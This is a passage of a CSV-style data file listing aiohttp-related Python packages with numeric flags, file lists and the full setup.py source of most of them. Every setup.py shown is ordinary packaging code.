print(""*********************"", file=sys.stderr)
setup(**setup_kwargs)
",1
aiohttp-jinja2-1.5,0,1,1,1,0,0,0,0,.coveragerc helpers.py py.typed typedefs.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst aiohttp-icon.ico api.rst conf.py index.rst make.bat Makefile aiohttp-icon-128x128.png LICENSE Makefile MANIFEST.in PKG-INFO README.rst requirements-dev.txt setup.cfg setup.py conftest.py test_context_processors.py test_jinja_filters.py test_jinja_globals.py test_simple_renderer.py __init__.py,"import codecs
import os
import re

from setuptools import setup


def _get_version():
    PATH_TO_INIT_PY = os.path.join(
        os.path.abspath(os.path.dirname(__file__)), ""aiohttp_jinja2"", ""__init__.py""
    )

    with codecs.open(PATH_TO_INIT_PY, ""r"", ""latin1"") as fp:
        try:
            for line in fp.readlines():
                if line:
                    line = line.strip()
                    version = re.findall(r'^__version__ = ""([^""]+)""$', line, re.M)
                    if version:
                        return version[0]
        except IndexError:
            raise RuntimeError(""Unable to determine version."")


version = _get_version()


def read(f):
    return open(os.path.join(os.path.dirname(__file__), f)).read().strip()


install_requires = [
    ""aiohttp>=3.6.3"",
    ""jinja2>=3.0.0"",
    'typing_extensions>=3.7.4; python_version<""3.8""',
]


setup(
    name=""aiohttp-jinja2"",
    version=version,
    description=(
        ""jinja2 template renderer for aiohttp.web "" ""(http server for asyncio)""
    ),
    long_description=""\n\n"".join((read(""README.rst""), read(""CHANGES.rst""))),
    classifiers=[
        ""License :: OSI Approved :: Apache Software License"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Development Status :: 5 - Production/Stable"",
        ""Topic :: Internet :: WWW/HTTP"",
        ""Framework :: AsyncIO"",
        ""Framework :: aiohttp"",
    ],
    author=""Andrew Svetlov"",
    author_email=""andrew.svetlov@gmail.com"",
    url=""https://github.com/aio-libs/aiohttp_jinja2/"",
    license=""Apache 2"",
    packages=[""aiohttp_jinja2""],
    python_requires="">=3.6"",
    install_requires=install_requires,
    include_package_data=True,
)
",1
aiohttp-middlewares-2.1.0,0,1,1,1,0,0,1,0,LICENSE PKG-INFO pyproject.toml README.rst setup.py annotations.py constants.py cors.py error.py https.py py.typed shield.py timeout.py utils.py __init__.py,"# -*- coding: utf-8 -*-
from setuptools import setup

package_dir = \
{'': 'src'}

packages = \
['aiohttp_middlewares']

package_data = \
{'': ['*']}

install_requires = \
['aiohttp>=3.8.1,<4.0.0', 'async-timeout>=4.0.2,<5.0.0', 'yarl>=1.5.1,<2.0.0']

setup_kwargs = {
    'name': 'aiohttp-middlewares',
    'version': '2.1.0',
    'description': 'Collection of useful middlewares for aiohttp applications.',
    'long_description': '===================\naiohttp-middlewares\n===================\n\n.. image:: https://github.com/playpauseandstop/aiohttp-middlewares/actions/workflows/ci.yml/badge.svg\n    :target: https://github.com/playpauseandstop/aiohttp-middlewares/actions/workflows/ci.yml\n    :alt: CI Workflow\n\n.. image:: https://img.shields.io/badge/pre--commit-enabled-brightgreen?logo=pre-commit&logoColor=white\n    :target: https://github.com/pre-commit/pre-commit\n    :alt: pre-commit\n\n.. image:: https://img.shields.io/badge/code%20style-black-000000.svg\n    :target: https://github.com/psf/black\n    :alt: black\n\n.. image:: https://img.shields.io/pypi/v/aiohttp-middlewares.svg\n    :target: https://pypi.org/project/aiohttp-middlewares/\n    :alt: Latest Version\n\n.. image:: https://img.shields.io/pypi/pyversions/aiohttp-middlewares.svg\n    :target: https://pypi.org/project/aiohttp-middlewares/\n    :alt: Python versions\n\n.. image:: https://img.shields.io/pypi/l/aiohttp-middlewares.svg\n    :target: https://github.com/playpauseandstop/aiohttp-middlewares/blob/main/LICENSE\n    :alt: BSD License\n\n.. image:: https://coveralls.io/repos/playpauseandstop/aiohttp-middlewares/badge.svg?branch=main&service=github\n    :target: https://coveralls.io/github/playpauseandstop/aiohttp-middlewares\n    :alt: Coverage\n\n.. image:: https://readthedocs.org/projects/aiohttp-middlewares/badge/?version=latest\n    :target: http://aiohttp-middlewares.readthedocs.org/en/latest/\n    :alt: Documentation\n\nCollection of useful middlewares for `aiohttp.web`_ applications.\n\n- Works on `Python`_ 3.7+\n- Works with `aiohttp.web`_ 3.8.1+\n- BSD licensed\n- Latest documentation `on Read The Docs\n  <https://aiohttp-middlewares.readthedocs.io/>`_\n- Source, issues, and pull requests `on GitHub\n  <https://github.com/playpauseandstop/aiohttp-middlewares>`_\n\n.. _`aiohttp.web`: https://docs.aiohttp.org/en/stable/web.html\n.. _`Python`: https://www.python.org/\n\nQuick Start\n===========\n\nBy default ``aiohttp.web`` does not provide `many built-in middlewares\n<https://docs.aiohttp.org/en/stable/web_reference.html#middlewares>`_ for\nstandart web-development needs such as: handling errors, shielding view\nhandlers, or providing CORS headers.\n\n``aiohttp-middlewares`` tries to fix this by providing several middlewares that\naims to cover most common web-development needs.\n\nFor example, to enable CORS headers for ``http://localhost:8081`` origin and\nhandle errors for ``aiohttp.web`` application you need to,\n\n.. code-block:: python\n\n    from aiohttp import web\n    from aiohttp_middlewares import (\n        cors_middleware,\n        error_middleware,\n    )\n\n\n    app = web.Application(\n        middlewares=(\n            cors_middleware(origins=(""http://localhost:8081"",)),\n            error_middleware(),\n        )\n    )\n\nCheck `documentation <https://aiohttp-middlewares.readthedocs.io/>`_ for\nall available middlewares and available initialization options.\n',
    'author': 'Igor Davydenko',
    'author_email': 'iam@igordavydenko.com',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://igordavydenko.com/projects.html#aiohttp-middlewares',
    'package_dir': package_dir,
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'python_requires': '>=3.7,<4.0',
}


setup(**setup_kwargs)
",0
aiohttp_retry-2.8.3,0,1,1,1,1,0,1,0,client.py py.typed retry_options.py types.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS LICENSE PKG-INFO pyproject.toml README.md setup.cfg setup.py,"from setuptools import find_packages, setup


with open(""README.md"", ""r"", encoding=""utf-8"") as fh:
    long_description = fh.read()


setup(
    name='aiohttp_retry',
    version='2.8.3',
    description='Simple retry client for aiohttp',
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    keywords='aiohttp retry client',
    author='Dmitry Inyutin',
    author_email='inyutin.da@gmail.com',
    url='https://github.com/inyutin/aiohttp_retry',
    license='MIT',
    include_package_data=True,
    packages=find_packages(exclude=[""tests"", ""tests.*""]),
    platforms=['any'],
    python_requires='>=3.7',
    install_requires=[
        'aiohttp',
    ],
    package_data={
        ""aiohttp_retry"": [""py.typed""],
    }
)
",0
aiohttp-session-2.11.0,0,1,1,1,0,0,1,0,cookie_storage.py log.py memcached_storage.py nacl_storage.py py.typed redis_storage.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.txt aiohttp-icon.ico conf.py glossary.rst index.rst make.bat Makefile reference.rst aiohttp-icon-128x128.png LICENSE Makefile MANIFEST.in PKG-INFO README.rst setup.cfg setup.py conftest.py test_abstract_storage.py test_cookie_storage.py test_encrypted_cookie_storage.py test_get_session.py test_http_exception.py test_memcached_storage.py test_nacl_storage.py test_path_domain.py test_redis_storage.py test_response_types.py test_session_dict.py test_session_middleware.py typedefs.py __init__.py,"import os
import re

from setuptools import setup

with open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), ""aiohttp_session"", ""__init__.py""
    ),
    encoding=""latin1"",
) as fp:
    try:
        version = re.findall(r'^__version__ = ""([^""]+)""$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError(""Unable to determine version."")


def read(f):
    return open(os.path.join(os.path.dirname(__file__), f)).read().strip()


install_requires = [""aiohttp>=3.8"", 'typing_extensions>=3.7.4; python_version<""3.8""']
extras_require = {
    ""aioredis"": [""aioredis>=2.0.0""],
    ""aiomcache"": [""aiomcache>=0.5.2""],
    ""pycrypto"": [""cryptography""],
    ""secure"": [""cryptography""],
    ""pynacl"": [""pynacl""],
}


setup(
    name=""aiohttp-session"",
    version=version,
    description=(""sessions for aiohttp.web""),
    long_description=""\n\n"".join((read(""README.rst""), read(""CHANGES.txt""))),
    long_description_content_type=""text/x-rst"",
    classifiers=[
        ""License :: OSI Approved :: Apache Software License"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Topic :: Internet :: WWW/HTTP"",
        ""Framework :: AsyncIO"",
        ""Framework :: aiohttp"",
    ],
    author=""Andrew Svetlov"",
    author_email=""andrew.svetlov@gmail.com"",
    url=""https://github.com/aio-libs/aiohttp_session/"",
    license=""Apache 2"",
    packages=[""aiohttp_session""],
    python_requires="">=3.7"",
    install_requires=install_requires,
    include_package_data=True,
    extras_require=extras_require,
)
",1
aiohttp_socks-0.7.1,0,1,1,1,1,0,1,0,connector.py utils.py _deprecated.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
import codecs
import os
import re
import sys

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(os.path.join(os.path.abspath(os.path.dirname(
        __file__)), 'aiohttp_socks', '__init__.py'), 'r', 'latin1') as fp:
    try:
        version = re.findall(r""^__version__ = '([^']+)'\r?$"",
                             fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError('Unable to determine version.')

if sys.version_info < (3, 6, 0):
    raise RuntimeError('aiohttp-socks requires Python 3.6+')

with open('README.md') as f:
    long_description = f.read()

setup(
    name='aiohttp_socks',
    author='Roman Snegirev',
    author_email='snegiryev@gmail.com',
    version=version,
    license='Apache 2',
    url='https://github.com/romis2012/aiohttp-socks',
    description='Proxy connector for aiohttp',
    long_description=long_description,
    long_description_content_type='text/markdown',
    packages=['aiohttp_socks'],
    keywords='asyncio aiohttp socks socks5 socks4 http proxy',
    install_requires=[
        'aiohttp>=2.3.2',
        'attrs>=19.2.0',
        'python-socks[asyncio]>=2.0.0,<3.0.0',
    ],
)
",0
aiohttp-sse-2.1.0,0,1,1,1,0,0,0,0,helpers.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"import ast
import codecs
import os
import sys

from setuptools import find_packages, setup

PY_VER = sys.version_info

if not PY_VER >= (3, 5):
    raise RuntimeError(""aiohttp-sse doesn't support Python earlier than 3.5"")


def read(f):
    with codecs.open(
        os.path.join(os.path.dirname(__file__), f), encoding=""utf-8""
    ) as ofile:
        return ofile.read()


class VersionFinder(ast.NodeVisitor):
    def __init__(self):
        self.version = None

    def visit_Assign(self, node):
        if not self.version:
            if node.targets[0].id == ""__version__"":
                self.version = node.value.s


def read_version():
    init_py = os.path.join(os.path.dirname(__file__), ""aiohttp_sse"", ""__init__.py"")
    finder = VersionFinder()
    finder.visit(ast.parse(read(init_py)))
    if finder.version is None:
        msg = ""Cannot find version in aiohttp_sse/__init__.py""
        raise RuntimeError(msg)
    return finder.version


install_requires = [""aiohttp>=3.0""]


setup(
    name=""aiohttp-sse"",
    version=read_version(),
    description=(""Server-sent events  support for aiohttp.""),
    lond_description=read(""README.rst""),
    classifiers=[
        ""License :: OSI Approved :: Apache Software License"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Topic :: Internet :: WWW/HTTP"",
        ""Framework :: AsyncIO"",
    ],
    author=""Nikolay Novik"",
    author_email=""nickolainovik@gmail.com"",
    url=""https://github.com/aio-libs/aiohttp_sse/"",
    license=""Apache 2"",
    python_requires="">=3.7"",
    packages=find_packages(),
    install_requires=install_requires,
    include_package_data=True,
)
",1
aiohttp-cors-0.7.0,0,1,1,1,1,0,0,0,abc.py cors_config.py mixin.py preflight_handler.py resource_options.py urldispatcher_router_adapter.py __about__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_basic_usage.py __init__.py test_main.py test_page.html test_real_browser.py __init__.py test_cors_config.py test_mixin.py test_preflight_handler.py test_resource_options.py test_urldispatcher_router_adapter.py test___about__.py __init__.py __init__.py,"# Copyright 2015 Vladimir Rutsky <vladimir@rutsky.org>
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import sys
from setuptools import setup


def read_file(filename):
    abs_path = os.path.join(os.path.dirname(__file__), filename)
    with open(abs_path, encoding=""utf-8"") as f:
        return f.read()


about = {}
exec(read_file(os.path.join(""aiohttp_cors"", ""__about__.py"")), about)

needs_pytest = {'pytest', 'test'}.intersection(sys.argv)
pytest_runner = ['pytest_runner'] if needs_pytest else []

# aiohttp requires Python >= 3.4.1, so as aiohttp_cors.
if sys.version_info[:3] < (3, 4, 1):
    print(""Error: aiohttp_cors requires Python interpreter version >= 3.4.1, ""
          ""this interpreter has version '{}'"".format(sys.version),
          file=sys.stderr)
    sys.exit(1)


setup(
    name=about[""__title__""],
    version=about[""__version__""],
    author=about[""__author__""],
    author_email=about[""__email__""],
    description=about[""__summary__""],
    url=about[""__uri__""],
    long_description=""\n\n"".join((
        read_file(""README.rst""),
        read_file(""CHANGES.rst""),
    )),
    packages=[""aiohttp_cors""],
    setup_requires=[
        # Environment markers were implemented and stabilized in setuptools
        # v20.8.1 (see <http://stackoverflow.com/a/32643122/391865>).
        ""setuptools>=20.8.1"",
        # If line above doesn't work, check that you have at least
        # setuptools v19.4 (released 2016-01-16):
        # <https://github.com/pypa/setuptools/issues/141>
    ] + pytest_runner,
    tests_require=[
        ""pytest"",
        ""pytest-cov"",
        ""pytest-pylint"",
        ""selenium"",
    ],
    test_suite=""tests"",
    install_requires=[
        ""aiohttp>=1.1"",
        ""typing;python_version<'3.5'"",
    ],
    license=about[""__license__""],
    classifiers=[
        ""License :: OSI Approved :: Apache Software License"",
        ""Intended Audience :: Developers"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Topic :: Software Development :: Libraries"",
        ""Topic :: Internet :: WWW/HTTP"",
        ""Framework :: AsyncIO"",
        ""Operating System :: MacOS :: MacOS X"",
        ""Operating System :: Microsoft :: Windows"",
        ""Operating System :: POSIX"",
        ""Development Status :: 3 - Alpha"",
    ],
)
",0
aioitertools-0.10.0,0,1,1,1,0,0,1,0,.flake8 .gitignore .pylint .readthedocs.yml asyncio.py builtins.py helpers.py itertools.py more_itertools.py py.typed asyncio.py builtins.py helpers.py itertools.py more_itertools.py __init__.py __main__.py types.py __init__.py __version__.py CHANGELOG.md CODE_OF_CONDUCT.md CONTRIBUTING.md api.rst changelog.rst conf.py contributing.rst index.rst custom.css badges.html omnilib.html LICENSE makefile MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.md requirements-dev.txt requirements.txt,,1
aiojobs-1.0.0,0,1,1,1,1,0,1,0,aiohttp.py py.typed _job.py _scheduler.py __init__.py PKG-INFO pyproject.toml README.rst,,1
aiokafka-0.7.2,1,1,1,1,0,0,0,0,abc.py client.py cluster.py conn.py consumer.py fetcher.py group_coordinator.py subscription_state.py __init__.py errors.py helpers.py message_accumulator.py producer.py sender.py transaction_manager.py __init__.py coordination.py fetch.py produce.py transaction.py control_record.py default_records.py legacy_records.py memory_records.py util.py _crc32c.py consts.pxi crc32c.c crc32c.h cutil.c cutil.pxd cutil.pyx default_records.c default_records.pxd default_records.pyx hton.pxd legacy_records.c legacy_records.pxd legacy_records.pyx memory_records.c memory_records.pyx __init__.py __init__.py structs.py util.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"import os
import platform
import re
import sys
from distutils.command.bdist_rpm import bdist_rpm as _bdist_rpm
from distutils.command.build_ext import build_ext
from distutils.errors import CCompilerError, DistutilsExecError, DistutilsPlatformError

from setuptools import Extension, setup


# Those are needed to build _hton for windows

CFLAGS = [""-O2""]
LDFLAGS = []
LIBRARIES = []

if platform.uname().system == ""Windows"":
    LDFLAGS.append(""ws2_32.lib"")
else:
    CFLAGS.extend([""-Wall"", ""-Wsign-compare"", ""-Wconversion""])
    LIBRARIES.append(""z"")

# The extension part is copied from aiohttp's setup.py

try:
    from Cython.Build import cythonize

    USE_CYTHON = True
except ImportError:
    USE_CYTHON = False

ext = "".pyx"" if USE_CYTHON else "".c""

extensions = [
    Extension(
        ""aiokafka.record._crecords.legacy_records"",
        [""aiokafka/record/_crecords/legacy_records"" + ext],
        libraries=LIBRARIES,
        extra_compile_args=CFLAGS,
        extra_link_args=LDFLAGS,
    ),
    Extension(
        ""aiokafka.record._crecords.default_records"",
        [
            ""aiokafka/record/_crecords/crc32c.c"",
            ""aiokafka/record/_crecords/default_records"" + ext,
        ],
        libraries=LIBRARIES,
        extra_compile_args=CFLAGS,
        extra_link_args=LDFLAGS,
    ),
    Extension(
        ""aiokafka.record._crecords.memory_records"",
        [""aiokafka/record/_crecords/memory_records"" + ext],
        libraries=LIBRARIES,
        extra_compile_args=CFLAGS,
        extra_link_args=LDFLAGS,
    ),
    Extension(
        ""aiokafka.record._crecords.cutil"",
        [""aiokafka/record/_crecords/crc32c.c"", ""aiokafka/record/_crecords/cutil"" + ext],
        libraries=LIBRARIES,
        extra_compile_args=CFLAGS,
        extra_link_args=LDFLAGS,
    ),
]


if USE_CYTHON:
    extensions = cythonize(extensions)


class bdist_rpm(_bdist_rpm):
    def _make_spec_file(self):
        orig = super()._make_spec_file()
        orig.insert(0, ""%define debug_package %{nil}"")
        return orig


class BuildFailed(Exception):
    pass


class ve_build_ext(build_ext):
    # This class allows C extension building to fail.

    def run(self):
        try:
            build_ext.run(self)
        except (DistutilsPlatformError, FileNotFoundError):
            raise BuildFailed()

    def build_extension(self, ext):
        try:
            build_ext.build_extension(self, ext)
        except (CCompilerError, DistutilsExecError, DistutilsPlatformError, ValueError):
            raise BuildFailed()


install_requires = [
    ""kafka-python>=2.0.0"",
    ""dataclasses>=0.5; python_version<'3.7'"",
]

PY_VER = sys.version_info

if PY_VER < (3, 6):
    raise RuntimeError(""aiokafka doesn't support Python earlier than 3.6"")


def read(f):
    return open(os.path.join(os.path.dirname(__file__), f)).read().strip()


extras_require = {
    ""snappy"": [""python-snappy>=0.5""],
}


def read_version():
    regexp = re.compile(r""^__version__\W*=\W*'([\d.abrcdev]+)'"")
    init_py = os.path.join(os.path.dirname(__file__), ""aiokafka"", ""__init__.py"")
    with open(init_py) as f:
        for line in f:
            match = regexp.match(line)
            if match is not None:
                return match.group(1)
        else:
            raise RuntimeError(""Cannot find version in aiokafka/__init__.py"")


classifiers = [
    ""License :: OSI Approved :: Apache Software License"",
    ""Intended Audience :: Developers"",
    ""Programming Language :: Python :: 3"",
    ""Programming Language :: Python :: 3.6"",
    ""Programming Language :: Python :: 3.7"",
    ""Operating System :: OS Independent"",
    ""Topic :: System :: Networking"",
    ""Topic :: System :: Distributed Computing"",
    ""Framework :: AsyncIO"",
    ""Development Status :: 4 - Beta"",
]


args = dict(
    name=""aiokafka"",
    version=read_version(),
    description=(""Kafka integration with asyncio.""),
    long_description=""\n\n"".join((read(""README.rst""), read(""CHANGES.rst""))),
    classifiers=classifiers,
    platforms=[""POSIX""],
    author=""Andrew Svetlov"",
    author_email=""andrew.svetlov@gmail.com"",
    url=""http://aiokafka.readthedocs.org"",
    download_url=""https://pypi.python.org/pypi/aiokafka"",
    license=""Apache 2"",
    packages=[""aiokafka""],
    install_requires=install_requires,
    extras_require=extras_require,
    include_package_data=True,
    ext_modules=extensions,
    cmdclass=dict(build_ext=ve_build_ext, bdist_rpm=bdist_rpm),
)

try:
    setup(**args)
except BuildFailed:
    print(""************************************************************"")
    print(""Cannot compile C accelerator module, use pure python version"")
    print(""************************************************************"")
    del args[""ext_modules""]
    del args[""cmdclass""]
    setup(**args)
",1
aiomultiprocess-0.9.0,0,1,1,1,0,0,1,0,.gitignore .pylint .pyup.yml .readthedocs.yml core.py pool.py scheduler.py base.py core.py perf.py pool.py scheduler.py __init__.py __main__.py types.py __init__.py __version__.py CHANGELOG.md CODE_OF_CONDUCT.md CONTRIBUTING.md api.rst changelog.rst conf.py contributing.rst guide.rst index.rst custom.css badges.html omnilib.html LICENSE makefile MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.md requirements-dev.txt setup.py,"#!/usr/bin/env python
# setup.py generated by flit for tools that don't yet use PEP 517

from distutils.core import setup

packages = \
['aiomultiprocess', 'aiomultiprocess.tests']

package_data = \
{'': ['*']}

setup(name='aiomultiprocess',
      version='0.9.0',
      description='AsyncIO version of the standard multiprocessing module',
      author='John Reese',
      author_email='john@noswap.com',
      url='https://aiomultiprocess.omnilib.dev',
      packages=packages,
      package_data=package_data,
      python_requires='>=3.6',
     )
",1
aiomysql-0.1.1,0,1,1,1,1,0,0,0,.coveragerc .flake8 .gitattributes dependabot.yml bug_report.yml feature_request.yml ci-cd.yml .gitignore .git_archival.txt .readthedocs.yaml .gitignore connection.py cursors.py log.py pool.py connection.py engine.py exc.py result.py transaction.py __init__.py utils.py _scm_version.py _scm_version.pyi _version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.txt CONTRIBUTING.rst docker-compose.yml conf.py connection.rst contributing.rst cursors.rst examples.rst glossary.rst index.rst make.bat Makefile pool.rst sa.rst tutorial.rst example.py example_callproc.py example_callproc_oldstyle.py example_cursors.py example_executemany.py example_executemany_oldstyle.py example_oldstyle.py example_pool.py example_pool_oldstyle.py example_simple_sa.py example_simple_sa_oldstyle.py example_ssl.py example_transaction.py example_transaction_oldstyle.py LICENSE Makefile PKG-INFO pyproject.toml README.rst requirements-dev.txt setup.cfg base.py conftest.py load_local_data.txt load_local_warn_data.txt my.cnf.tcp.tmpl my.cnf.unix.tmpl test_sa_compiled_cache.py test_sa_connection.py test_sa_default.py test_sa_distil.py test_sa_engine.py test_sa_transaction.py test_sa_types.py __init__.py README.md socket.cnf ca-key.pem ca.pem server-cert.pem server-key.pem server-req.pem tls.cnf test_async_iter.py test_async_with.py test_basic.py test_bulk_inserts.py test_connection.py test_cursor.py test_deserialize_cursor.py test_dictcursor.py test_issues.py test_load_local.py test_nextset.py test_pool.py test_sha_connection.py test_sscursor.py test_ssl.py _testutils.py __init__.py,,1
aiopg-1.3.4,0,1,1,1,0,0,0,0,connection.py log.py pool.py py.typed connection.py engine.py exc.py result.py transaction.py utils.py __init__.py utils.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.txt LICENSE MAINTAINERS.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"import re
from pathlib import Path

from setuptools import setup, find_packages

install_requires = [""psycopg2-binary>=2.8.4"", ""async_timeout>=3.0,<5.0""]
extras_require = {""sa"": [""sqlalchemy[postgresql_psycopg2binary]>=1.3,<1.5""]}


def read(*parts):
    return Path(__file__).resolve().parent.joinpath(*parts).read_text().strip()


def get_maintainers(path=""MAINTAINERS.txt""):
    return "", "".join(x.strip().strip(""*"").strip() for x in read(path).splitlines())


def read_version():
    regexp = re.compile(r""^__version__\W*=\W*\""([\d.abrc]+)\"""")
    for line in read(""aiopg"", ""__init__.py"").splitlines():
        match = regexp.match(line)
        if match is not None:
            return match.group(1)

    raise RuntimeError(""Cannot find version in aiopg/__init__.py"")


def read_changelog(path=""CHANGES.txt""):
    return f""Changelog\n---------\n\n{read(path)}""


classifiers = [
    ""License :: OSI Approved :: BSD License"",
    ""Intended Audience :: Developers"",
    ""Programming Language :: Python :: 3"",
    ""Programming Language :: Python :: 3 :: Only"",
    ""Programming Language :: Python :: 3.6"",
    ""Programming Language :: Python :: 3.7"",
    ""Programming Language :: Python :: 3.8"",
    ""Programming Language :: Python :: 3.9"",
    ""Programming Language :: Python :: 3.10"",
    ""Operating System :: POSIX"",
    ""Operating System :: MacOS :: MacOS X"",
    ""Operating System :: Microsoft :: Windows"",
    ""Environment :: Web Environment"",
    ""Development Status :: 5 - Production/Stable"",
    ""Topic :: Database"",
    ""Topic :: Database :: Front-Ends"",
    ""Framework :: AsyncIO"",
]

setup(
    name=""aiopg"",
    version=read_version(),
    description=""Postgres integration with asyncio."",
    long_description=""\n\n"".join((read(""README.rst""), read_changelog())),
    long_description_content_type=""text/x-rst"",
    classifiers=classifiers,
    platforms=[""macOS"", ""POSIX"", ""Windows""],
    author=""Andrew Svetlov"",
    python_requires="">=3.6"",
    project_urls={
        ""Chat: Gitter"": ""https://gitter.im/aio-libs/Lobby"",
        ""CI: GA"": ""https://github.com/aio-libs/aiopg/actions?query=workflow%3ACI"",
        ""Coverage: codecov"": ""https://codecov.io/gh/aio-libs/aiopg"",
        ""Docs: RTD"": ""https://aiopg.readthedocs.io"",
        ""GitHub: issues"": ""https://github.com/aio-libs/aiopg/issues"",
        ""GitHub: repo"": ""https://github.com/aio-libs/aiopg"",
    },
    author_email=""andrew.svetlov@gmail.com"",
    maintainer=get_maintainers(),
    maintainer_email=""virmir49@gmail.com"",
    url=""https://aiopg.readthedocs.io"",
    download_url=""https://pypi.python.org/pypi/aiopg"",
    license=""BSD"",
    packages=find_packages(),
    install_requires=install_requires,
    extras_require=extras_require,
    include_package_data=True,
)
",0
aioprometheus-22.5.0,0,1,1,1,1,0,1,0,middleware.py quart.py starlette.py __init__.py collectors.py decorators.py base.py binary.py mypy_types.py text.py __init__.py histogram.py metricdict.py mypy_types.py negotiator.py process.py pusher.py py.typed registry.py renderer.py service.py __init__.py METADATA RECORD top_level.txt WHEEL,,1
aioredis-2.0.1,0,1,1,0,1,0,0,0,client.py compat.py connection.py exceptions.py lock.py log.py py.typed sentinel.py utils.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.md CONTRIBUTORS.txt LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py compat.py conftest.py test_commands.py test_connection.py test_connection_pool.py test_encoding.py test_lock.py test_monitor.py test_multiprocessing.py test_pipeline.py test_pubsub.py test_scripting.py test_sentinel.py __init__.py,"import os.path
import re

from setuptools import find_packages, setup


def read(*parts):
    with open(os.path.join(*parts)) as f:
        return f.read().strip()


def read_version():
    regexp = re.compile(r""^__version__\W*=\W*\""([\d.abrc]+)\"""")
    init_py = os.path.join(os.path.dirname(__file__), ""aioredis"", ""__init__.py"")
    with open(init_py) as f:
        for line in f:
            match = regexp.match(line)
            if match is not None:
                return match.group(1)
        raise RuntimeError(f""Cannot find version in {init_py}"")


classifiers = [
    ""License :: OSI Approved :: MIT License"",
    ""Development Status :: 5 - Production/Stable"",
    ""Programming Language :: Python"",
    ""Programming Language :: Python :: 3"",
    ""Programming Language :: Python :: 3.6"",
    ""Programming Language :: Python :: 3.7"",
    ""Programming Language :: Python :: 3.8"",
    ""Programming Language :: Python :: 3.9"",
    ""Programming Language :: Python :: 3.10"",
    ""Programming Language :: Python :: 3 :: Only"",
    ""Operating System :: POSIX"",
    ""Environment :: Web Environment"",
    ""Intended Audience :: Developers"",
    ""Topic :: Software Development"",
    ""Topic :: Software Development :: Libraries"",
    ""Framework :: AsyncIO"",
]

setup(
    name=""aioredis"",
    version=read_version(),
    description=""asyncio (PEP 3156) Redis support"",
    long_description=""\n\n"".join((read(""README.md""), read(""CHANGELOG.md""))),
    long_description_content_type=""text/markdown"",
    classifiers=classifiers,
    platforms=[""POSIX""],
    url=""https://github.com/aio-libs/aioredis-py"",
    license=""MIT"",
    packages=find_packages(exclude=[""tests""]),
    install_requires=[
        ""async-timeout"",
        ""typing-extensions"",
    ],
    extras_require={
        ""hiredis"": 'hiredis>=1.0; implementation_name==""cpython""',
    },
    package_data={""aioredis"": [""py.typed""]},
    python_requires="">=3.6"",
    include_package_data=True,
)
",0
aioresponses-0.7.3,0,1,1,1,1,0,0,0,.coveragerc ci.yml flake8.yml .landscape.yml .pyup.yml compat.py core.py py.typed __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS AUTHORS.rst ChangeLog CONTRIBUTING.rst aioresponses.rst authors.rst conf.py contributing.rst history.rst index.rst installation.rst make.bat Makefile modules.rst readme.rst usage.rst HISTORY.rst LICENSE Makefile MANIFEST.in PKG-INFO README.rst requirements-dev.txt requirements.txt setup.cfg setup.py base.py test_aioresponses.py test_compat.py __init__.py tox.ini unittest.cfg,"#!/usr/bin/env python
import setuptools

setuptools.setup(
    setup_requires=['pbr'],
    pbr=True,
)
",1
